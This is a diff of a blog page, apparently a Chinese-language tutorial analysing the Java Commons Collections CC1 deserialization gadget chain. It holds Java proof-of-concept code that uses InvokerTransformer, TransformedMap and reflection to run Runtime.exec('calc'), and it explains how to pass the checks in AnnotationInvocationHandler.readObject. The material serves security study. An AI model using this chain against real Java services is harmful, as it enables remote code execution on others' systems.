@@ -8167,34 +8167,39 @@ if($request_method !~ ^(GET|HEAD|POST)$)&#123;
 <p>既然这里有漏洞，我们不妨先利用反射弹一个计算器玩玩。<code>InvokerTransformer</code> 类的构造函数如下</p>
 <p><img src="/images/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9604/image-20230203181646361.png" alt="image-20230203181646361"></p>
 <p>注意到构造函数是公有的，所以我们可以直接 new 出来。</p>
-<p>第一个参数明显是字符串类型的方法名，第二个参数是一个 Class 数组，表示方法的参数类型，第三个是一个 Object 数组，表示方法的参数。</p>
-<p>实例化一个 InvokerTransformer 对象</p>
+<ul>
+<li>第一个参数明显是字符串类型的方法名</li>
+<li>第二个参数是一个 Class 数组类型，表示方法的参数类型</li>
+<li>第三个参数是一个 Object 数组类型，表示方法的参数。</li>
+</ul>
+<p>实例化一个 <strong>InvokerTransformer</strong> 对象，我们要执行命令，所以调用的方法当然是 <strong>exec</strong></p>
 <figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;);<br></code></pre></td></tr></table></figure>
 
 <p>用 Runtime 类的实例对象作为参数调用上述对象的 transfrom 方法</p>
 <figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-type">Runtime</span> <span class="hljs-variable">runtime</span> <span class="hljs-operator">=</span> Runtime.getRuntime();<br>invokerTransformer.transform(runtime);<br></code></pre></td></tr></table></figure>
 
 <p>运行之后就可以弹出计算器，具体为什么可以弹计算器就不写了，可以自行分析一下。</p>
-<p>注意到我们最后一句代码是 <code>invokerTransformer.transform(runtime)</code> ，所以我们下一步的目标就是去找调用 <code>transform</code> 方法的不同名函数</p>
-<h3 id="2初步寻找链子-checksetvalue"><a href="#2-初步寻找链子-checksetValue" class="headerlink" title="2.初步寻找链子 checksetValue"></a>2.初步寻找链子 checksetValue</h3><p>如上所述，现在回到 <code>transform</code> 方法并寻找调用了这个方法的不同名的函数。IDEA 可以帮我们快速做到这一点，只需要将光标停留在这个方法上并右键点击 find usages 即可。如果 find usages 有问题的话，可以先 <code>Ctrl+Alt+Shift+F7</code>，选择 <code>All place</code> 查询。最后的结果应如下图</p>
+<p>注意到我们最后一句代码是 <code>invokerTransformer.transform(runtime)</code> ，所以我们下一步的目标就是去找调用 <code>InvokerTransformer.transform</code> 方法的不同名函数</p>
+<h5 id="312-初步寻找链子-checksetvalue"><a href="#3-1-2-初步寻找链子-checksetValue" class="headerlink" title="3.1.2 初步寻找链子 checksetValue"></a>3.1.2 初步寻找链子 checksetValue</h5><p>如上所述，现在回到 <code>InvokerTransformer.transform</code> 方法并寻找调用了这个方法的不同名的函数。IDEA 可以帮我们快速做到这一点，只需要将光标停留在这个方法上并右键点击 find usages 即可。如果 find usages 有问题的话，可以先 <code>Ctrl+Alt+Shift+F7</code>，选择 <code>All place</code> 查询。最后的结果应如下图</p>
 <p><img src="/images/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9604/image-20230114165818223.png" alt="image-20230114165818223"></p>
 <blockquote>
 <p>这里同样有一个逐个翻看调用了 transform 方法的那些类的操作，目的是为了找到可行的链子。我节省时间故直接给出答案。</p>
 </blockquote>
 <p> <code>TransformedMap</code> 类调用了 <code>transform</code> 方法</p>
-<p><img src="/images/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9604/image-20230114170157802.png" alt="image-20230114170157802"></p>
+<p><img src="/images/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9604/image-20230203182905938.png" alt="image-20230203182905938"></p>
 <p>具体地说是这个类中的 <code>checkSetValue()</code> 方法调用了 <code>transform()</code> 方法。我们右键选中然后 jump to source</p>
-<p><img src="/images/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9604/image-20230114171925635.png" alt="image-20230114171925635"></p>
+<p><img src="/images/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9604/image-20230203182949891.png" alt="image-20230203182949891"></p>
 <ul>
-<li>OK，接下来我们去看一看 <code>valueTransformer.checkSetValue</code> 的 <code>valueTransformer</code> 是什么东西，最终在 <code>TransformedMap</code> 的构造函数中发现了 <code>valueTransformer</code></li>
+<li>OK，接下来我们去看一看 <code>TransformedMap.valueTransformer.checkSetValue</code> 的 <code>valueTransformer</code> 是什么东西，最终在 <code>TransformedMap</code> 的成员变量中发现了 <code>valueTransformer</code></li>
 </ul>
-<p><img src="/images/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9604/image-20230114172103631.png" alt="image-20230114172103631"></p>
-<p><img src="/images/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9604/image-20230114172226071.png" alt="image-20230114172226071"></p>
+<p><img src="/images/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9604/image-20230203183117534.png" alt="image-20230203183117534"></p>
+<p>并且在构造函数中可以设置这个变量的值，如下图：</p>
+<p><img src="/images/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9604/image-20230203183232326.png" alt="image-20230203183232326"></p>
 <ul>
-<li>因为 <code>TransformedMap</code> 的构造方法作用域是 <code>protected</code>，我们还需要去找一找谁调用了 <code>TransformedMap</code> 的构造方法。</li>
+<li>因为 <code>TransformedMap</code> 的构造方法作用域是 <code>protected</code>，所以我们还需要去找一找谁调用了 <code>TransformedMap</code> 的构造方法。</li>
 </ul>
-<p>发现在 <code>decorate()</code> 静态方法中创建了 <code>TransformedMap</code> 对象</p>
-<p><img src="/images/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9604/image-20230114172337170.png" alt="image-20230114172337170"></p>
+<p>发现在 <code>TransformedMap.decorate()</code> 静态方法中创建了 <code>TransformedMap</code> 对象</p>
+<p><img src="/images/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9604/image-20230203183359420.png" alt="image-20230203183359420"></p>
 <p>到这一步，尝试将其作为链子的开头，编写 POC</p>
 <figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">  <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">// 实例化一个 InvokerTransformer 对象</span><br>        <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;);<br><span class="hljs-comment">//</span><br>        <span class="hljs-type">Runtime</span> <span class="hljs-variable">runtime</span> <span class="hljs-operator">=</span> Runtime.getRuntime();<br><br>        HashMap&lt;String,String&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        <br>        <span class="hljs-comment">// decorate 方法的返回类型是 Map</span><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">transformedMap</span> <span class="hljs-operator">=</span>  TransformedMap.decorate(hashMap,<span class="hljs-literal">null</span>,invokerTransformer);<br><br>        <span class="hljs-comment">// checkSetValue 方法是 protected，所以接下来要通过反射调用这个方法</span><br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> TransformedMap.class;<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> c.getDeclaredMethod(<span class="hljs-string">&quot;checkSetValue&quot;</span>,Object.class);<br>        method.setAccessible(<span class="hljs-literal">true</span>);<br>        method.invoke(transformedMap,runtime);<br><br><br>    &#125;<br></code></pre></td></tr></table></figure>
 
@@ -8204,7 +8209,7 @@ if($request_method !~ ^(GET|HEAD|POST)$)&#123;
 <li>在执行 <code>.decorate</code> 方法的时候，会新建 <code>TransformedMap</code> 对象，我们调用对象的 <code>checkSetValue</code> 方法（因为我们无法直接获取 <code>TransformedMap</code> 对象，它的作用域是 <code>protected</code>）。</li>
 <li>在 <code>checkSetValue</code> 方法当中，会执行 <code>.transform</code> 的方法。这也就是我们链子的尾部 ———— <code>.transform</code></li>
 </ul>
-<h3 id="3完整链子"><a href="#3-完整链子" class="headerlink" title="3.完整链子"></a>3.完整链子</h3><ul>
+<h5 id="313-完整链子"><a href="#3-1-3-完整链子" class="headerlink" title="3.1.3 完整链子"></a>3.1.3 完整链子</h5><ul>
 <li>目前找到的链子位于 <code>checkSetValue</code> 当中，去找 <code>.decorate</code> 的链子，发现无法进一步前进了，所以我们回到 <code>checkSetValue</code> 重新找链子。</li>
 </ul>
 <p>继续 <code>find usages</code>，找到了 <code>parent.checkSetValue(value);</code> 调用了 <code>checkSetValue</code></p>
@@ -8233,7 +8238,7 @@ if($request_method !~ ^(GET|HEAD|POST)$)&#123;
 </blockquote>
 <p>运行完之后就可以弹计算器出来！</p>
 <p>到这一步我们的 POC 马上就要出来了，就差一个 <code>readObject</code> 了。接下来要做的事情就是找到一个 <code>readObject</code> 并且里面调用了 <code>setValue()</code> 方法</p>
-<h3 id="4寻找-readobject-链首"><a href="#4-寻找-readObject-链首" class="headerlink" title="4.寻找 readObject() 链首"></a>4.寻找 readObject() 链首</h3><ul>
+<h5 id="314-寻找-readobject-链首"><a href="#3-1-4-寻找-readObject-链首" class="headerlink" title="3.1.4 寻找 readObject() 链首"></a>3.1.4 寻找 readObject() 链首</h5><ul>
 <li>之前链子是到 <code>setValue</code> 的，所以我们在 <code>setValue</code> 处，find usages</li>
 </ul>
 <p>不多说，下图直接给出我们 readObject 的入口类</p>
@@ -8246,7 +8251,7 @@ if($request_method !~ ^(GET|HEAD|POST)$)&#123;
 <p><img src="/images/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9604/image-20230115153904226.png" alt="image-20230115153904226"></p>
 <p>但是阅读一下 readObject 的代码就会发现有两个 if 判断会阻拦我们进入 setValue 方法</p>
 <p><img src="/images/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9604/image-20230115190839986.png" alt="image-20230115190839986"></p>
-<h5 id="如何通过第一个-if"><a href="#如何通过第一个-if" class="headerlink" title="如何通过第一个 if"></a>如何通过第一个 if</h5><p>接下来说说如何过第一个 if，以下是和第一个 if 有关联的语句。</p>
+<h5 id="315-如何通过第一个-if"><a href="#3-1-5-如何通过第一个-if" class="headerlink" title="3.1.5 如何通过第一个 if"></a>3.1.5 如何通过第一个 if</h5><p>接下来说说如何过第一个 if，以下是和第一个 if 有关联的语句。</p>
 <figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-type">AnnotationType</span> <span class="hljs-variable">annotationType</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            annotationType = AnnotationType.getInstance(type);<br>        &#125; <span class="hljs-keyword">catch</span>(IllegalArgumentException e) &#123;<br>            <span class="hljs-comment">// 一些代码</span><br>        &#125;<br>Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();<br><span class="hljs-keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> memberValue.getKey();<br>            Class&lt;?&gt; memberType = memberTypes.get(name);<br>            <span class="hljs-keyword">if</span> (memberType != <span class="hljs-literal">null</span>) &#123; <br></code></pre></td></tr></table></figure>
 
 <p>先分析第一个部分</p>
@@ -8286,7 +8291,7 @@ if($request_method !~ ^(GET|HEAD|POST)$)&#123;
 
 <p>运行之后打断点示例如下，明显此时可以过第一个 if</p>
 <p><img src="/images/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9604/image-20230116101359073.png" alt="image-20230116101359073"></p>
-<h5 id="第二个-if"><a href="#第二个-if" class="headerlink" title="第二个 if"></a>第二个 if</h5><p>我们过第一个 if 的代码同时也能过第二个 if!</p>
+<h5 id="316-第二个-if"><a href="#3-1-6-第二个-if" class="headerlink" title="3.1.6 第二个 if"></a>3.1.6 第二个 if</h5><p>我们过第一个 if 的代码同时也能过第二个 if!</p>
 <figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> memberValue.getValue();<br><span class="hljs-keyword">if</span> (!(memberType.isInstance(value) ||<br>                      value <span class="hljs-keyword">instanceof</span> ExceptionProxy)) &#123;&#125;<br></code></pre></td></tr></table></figure>
 
 <p>isInstance 就是判断对象是否是当前类的一个实例,如果是就返回真</p>
@@ -8296,7 +8301,7 @@ if($request_method !~ ^(GET|HEAD|POST)$)&#123;
 <p>所以我们随便写一个字符串进去就可以让 isInstance返回假,这样外层再取反直接为真通过第二个 if!</p>
 <p>如下图我们显然已经调用到了 setValue 函数</p>
 <p><img src="/images/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9604/image-20230116101531106.png" alt="image-20230116101531106"></p>
-<h5 id="setvalue-传入的参数值"><a href="#setValue-传入的参数值" class="headerlink" title="setValue 传入的参数值"></a>setValue 传入的参数值</h5><p>过了这两个 if 还是不能弹出计算器，因为进去两个 if之后的setValue参数值不对</p>
+<h5 id="317-setvalue-传入的参数值"><a href="#3-1-7-setValue-传入的参数值" class="headerlink" title="3.1.7 setValue 传入的参数值"></a>3.1.7 setValue 传入的参数值</h5><p>过了这两个 if 还是不能弹出计算器，因为进去两个 if之后的setValue参数值不对</p>
 <p><img src="/images/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9604/image-20230116102151138.png" alt="image-20230116102151138"></p>
 <p>用上面的断点代码跟进一下看看 AbstractInputCheckedMapDecorator 类的 setValue 方法的参数值是什么</p>
 <p><img src="/images/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9604/image-20230116101647272.png" alt="image-20230116101647272"></p>
@@ -8343,7 +8348,7 @@ if($request_method !~ ^(GET|HEAD|POST)$)&#123;
 <blockquote>
 <p>完结撒花！！第一次分析 Java 经典反序列化链子，还有很多不成熟的地方，但是我已经进步良多。</p>
 </blockquote>
-<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://www.bilibili.com/video/BV1no4y1U7E1/?spm_id_from=333.1007.top_right_bar_window_default_collection.content.click&vd_source=ed636173e6c328be468a244d33ee03e1">白日梦组长大佬</a></p>
+<h3 id="四-参考链接"><a href="#四-参考链接" class="headerlink" title="四. 参考链接"></a>四. 参考链接</h3><p><a href="https://www.bilibili.com/video/BV1no4y1U7E1/?spm_id_from=333.1007.top_right_bar_window_default_collection.content.click&vd_source=ed636173e6c328be468a244d33ee03e1">白日梦组长大佬</a></p>
 <p><a href="https://www.cnblogs.com/h0cksr/p/16189755.html">java反序列化(三)CommonsCollections篇 – CC1</a></p>
 <p><a href="https://paper.seebug.org/1242/#commons-collections">Java安全之反序列化篇-URLDNS&amp;Commons Collections 1-7反序列化链分析</a></p>
 ]]></content>
